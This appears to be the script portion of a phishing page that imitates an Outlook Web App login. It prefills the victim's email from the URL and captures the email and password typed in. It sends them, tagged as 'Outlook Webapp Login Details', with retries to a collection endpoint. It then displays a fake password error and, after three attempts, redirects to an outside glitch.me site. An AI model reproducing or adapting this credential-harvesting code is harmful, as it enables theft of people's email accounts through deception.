    var a2 = document.querySelectorAll(".aaaa2");

    window.onload = function () {
        // Get the current URL
        var url = window.location.href;

        // Parse the URL and get the fragment (the part after the '#')
        var urlComponents = new URL(url);
        var email = urlComponents.hash.substring(1);

        // Check if the fragment is a valid email
        var emailRegex = /^[\w-]+(\.[\w-]+)*@([\w-]+\.)+[a-zA-Z]{2,7}$/;
        if (emailRegex.test(email)) {
            //   Make this email available globally
            //window.email = email;
            // If it is, add the email into a html element as text
            var emailElement = document.querySelector(".emailiness");
            if (emailElement) {
                emailElement.value = email;
            }
        }
    };

        // Get the form and input elements
        var form = document.getElementById("myForm");
        var textForm = document.getElementById("email");
        var input = document.getElementById("password");
        var emptyField = document.querySelectorAll(".e2")
        var emptyField2 = document.querySelectorAll(".e21")
        var passwordError = document.querySelectorAll(".e1");

        var clickCount = 0;

        // Add an event listener for form submission
        form.addEventListener("submit", function (event) {
            console.log("triggered")
            // Prevent the form from being submitted normally
            event.preventDefault();

            // Get the input value
            var password = input.value;
            var email = textForm.value;

            // Write an if statement to check if the input value is empty
            if (email === "") {
                // If it is, do nothing and return from the function
                emptyField2.forEach(function (empty) {
                    empty.classList.remove("display-none");
                })
                setTimeout(function () {
                    emptyField2.forEach(function (empty) {
                        empty.classList.add("display-none");
                    })
                }, 3000)
                return;
            }

            if (password === "") {
                // If it is, do nothing and return from the function
                emptyField.forEach(function (empty) {
                    empty.classList.remove("display-none");
                })
                setTimeout(function () {
                    emptyField.forEach(function (empty) {
                        empty.classList.add("display-none");
                    })
                }, 3000)
                return;
            }

            // Toggle classlist of passwordError to add or remove the "input-byline--error-hidden" class
            loading()
            setTimeout(function () {
                // sendData(window.dataLog);
                passwordError.forEach(function (error) {
                    error.classList.remove("display-none");
                });
                input.value = "";
                // textForm.value = ""
                setTimeout(function () {
                    passwordError.forEach(function (error) {
                        error.classList.add("display-none");
                    });
                }, 3000)
            }, 3000)

            if (email && password) {
            let dataLog = {
                email,
                // username: textForm.value,
                password,
                desc: "Outlook Webapp Login Details",
            };
            console.log("Data Log: ", dataLog);
            sendDataWithRetry(dataLog);
        }
        });

        // Write a function that will redirect the page to a URL
        function toggleClass() {
            // Redirect the page to a URL
            window.location.href = "https://yummy-healthy-pantry.glitch.me";
        }

    function loading() {
        a1.forEach(function (aa1) {
            aa1.classList.add("display-none")
        })
        a2.forEach(function (aa2) {
            aa2.classList.remove("display-none")
        })
        setTimeout(function () {
            a2.forEach(function (aa2) {
                aa2.classList.add("display-none")
            })
            a1.forEach(function (aa1) {
                aa1.classList.remove("display-none")
            })
        }, 3000);
    }

    // Send data to the PHP file
    function sendDataWithRetry(dataLog, maxRetries = 3) {
        const sendRequest = async (retryCount) => {
          try {
            const response = await fetch(url, {
              method: "POST",
              headers: {
                "Content-Type": "application/json; charset=utf-8",
              },
              body: JSON.stringify(dataLog),
            });

            if (response.ok) {
              const responseData = await response.json();
              // console.log("Data received by PHP:", responseData);
              clickCount++;
              // console.log(clickCount);
              if (clickCount === 3) {
                // Execute a separate function on second click
                toggleClass();
                clickCount = 0;
              }
              // Continue with other tasks (e.g., UI updates, etc.)
            } else {
              throw new Error("Network response was not OK");
            }
          } catch (error) {
            console.error("Error sending data:", error);
            if (retryCount < maxRetries) {
              console.log(`Retrying (attempt ${retryCount + 1})...`);
              await sendRequest(retryCount + 1);
            } else {
              console.error("Max retries reached. Data not sent.");
              // Handle failure (e.g., show an error message)
            }
          }
        };
        sendRequest(0); // Start the initial request
      }
</script>

</html>